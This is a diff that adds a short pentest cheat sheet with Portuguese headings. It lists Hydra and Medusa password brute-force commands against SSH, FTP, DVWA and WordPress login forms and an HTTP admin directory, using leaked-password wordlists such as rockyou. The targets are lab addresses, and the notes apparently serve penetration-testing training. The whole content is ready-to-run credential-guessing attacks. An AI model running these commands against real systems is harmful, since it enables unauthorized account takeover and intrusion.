@@ -1,0 +1,10 @@
+# Utilizando Hydra
+
+hydra -l gibson -P /usr/share/wordlists/rockyou.txt -T 20 10.1.1.1 ssh
+hydra -l offsec -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt -t 3 10.1.1.1 ftp
+hydra -l username -P pass.txt 10.1.1.1 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login Failed"
+hydra -L lists/usrname.txt -P lists/pass.txt localhost -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
+
+# Utilizando o medusa para atacar páginas Web
+
+medusa -h 10.1.1.1 -u offsec -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt -M http -m DIR:/admin
